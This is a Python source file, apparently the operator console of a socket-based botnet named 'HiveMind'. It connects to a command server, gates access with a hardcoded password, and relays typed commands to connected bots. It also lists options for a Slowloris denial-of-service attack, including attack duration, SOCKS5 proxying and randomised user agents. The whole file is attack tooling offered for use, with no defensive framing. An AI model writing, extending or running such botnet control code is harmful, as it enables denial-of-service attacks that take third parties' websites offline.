import socket
import random
from threading import Thread
import argparse
import sys
import getpass


parser = argparse.ArgumentParser(
    description="HiveMind, python bot net using sockets"
)

parser.add_argument("host", nargs="?", help="Address of the Server")

parser.add_argument(
    "-p", "--port", default=420, help="Port of the Server, default 5000", type=int
)


args = parser.parse_args()


if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required! \n")
    parser.print_help()
    sys.exit(1)


s = socket.socket()
print(f"[*] Connecting to {args.host}:{args.port}...")
s.connect((args.host, args.port))
print("[+] Connected.")
    

print("""
  _    _ _           __  __ _           _ 
 | |  | (_)         |  \/  (_)         | |
 | |__| |___   _____| \  / |_ _ __   __| |
 |  __  | \ \ / / _ \ |\/| | | '_ \ / _` |
 | |  | | |\ V /  __/ |  | | | | | | (_| |
 |_|  |_|_| \_/ \___|_|  |_|_|_| |_|\__,_|
  HiveMind v 1.0 | fluffydolphin
""")


password = getpass.getpass('Password: ')
if password == 'Hoey4639!':
    print('connected')
else:
    print('Password is incorrect, restart and try again \n')
    sin = "!quit!"
    s.send(sin.encode())
    s.close()
    sys.exit()



def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        print("\n" + message)


t = Thread(target=listen_for_messages)
t.daemon = True
t.start()


while True:
    to_send =  input()
    to_send = f"{to_send}"
    if '!help!' in to_send:
        print("""
!help!               Shows you this

!connected!          Shows you how many and which bots are connected'

!slowloris!          Shows you the help command for Slowloris

Type anything to use HiveMind
""")
    if '!slowloris!' in to_send:
        print("""
Slowloris, low bandwidth stress test tool for websites

positional arguments:
  host                  Host to perform stress test on

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port of webserver, usually 80
  -s SOCKETS, --sockets SOCKETS
                        Number of sockets to use in the test
  -v, --verbose         Increases logging
  -ua, --randuseragents
                        Randomizes user-agents with each request
  -x, --useproxy        Use a SOCKS5 proxy for connecting
  --proxy-host PROXY_HOST
                        SOCKS5 proxy host
  --proxy-port PROXY_PORT
                        SOCKS5 proxy port
  --https               Use HTTPS for the requests
  --sleeptime SLEEPTIME
                        Time to sleep between each header sent.
  --duration DURATION   Duration of attack.
""")
    else: s.send(to_send.encode())
    if "!quit!" in to_send:
        s.close()
        sys.exit()


s.close()
